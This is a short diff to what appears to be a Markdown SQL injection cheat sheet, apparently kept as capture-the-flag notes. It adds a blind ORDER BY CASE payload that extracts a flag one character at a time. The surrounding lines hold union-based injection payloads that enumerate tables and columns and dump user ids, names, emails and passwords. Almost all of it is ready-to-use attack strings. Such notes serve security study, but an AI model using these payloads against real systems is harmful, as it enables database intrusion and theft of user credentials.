@@ -34,6 +34,7 @@ Until error occurs, then:
 ' union select 1,2,3,concat(table_name, ':') from information_schema.tables where table_schema = '[DB_NAME]'-- -   # table name
 ' union select 1,2,3,concat(column_name, ':') from information_schema.columns where table_name = '[TABLE_NAME]'-- -   # column name
 ' union select 1,2,3,concat(id, ':', name, ':', email, ':', password) from user-- -   # column content
+order by (CASE WHEN (SELECT (SUBSTRING(flag,1,1)) from flag) = 'a' then title else date end) ASC
 ```
 
 ### Simple SQL injection test
